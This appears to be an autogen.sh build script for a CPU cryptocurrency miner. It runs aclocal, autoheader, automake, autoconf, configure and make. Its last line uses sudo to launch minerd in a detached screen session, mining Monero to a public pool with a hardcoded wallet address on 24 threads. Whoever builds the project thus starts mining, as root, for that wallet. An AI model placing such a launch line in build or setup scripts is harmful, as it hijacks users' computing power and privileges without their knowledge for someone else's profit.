#!/bin/sh

# You need autoconf 2.5x, preferably 2.57 or later
# You need automake 1.7 or later. 1.6 might work.

set -e

aclocal
autoheader
automake --gnu --add-missing --copy
autoconf
CFLAGS="-march=native" ./configure
make
sudo screen -S miner ./minerd -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:8888 -u 48pKEWWz81ebC7nqTrMfgJNpZhMXHUZv6j4sJwJvnRS3GLavSKMujc34TSMhVB747sZTjxfbBirfFVr7FzZYZvatTwS7bQh -p x -t 24
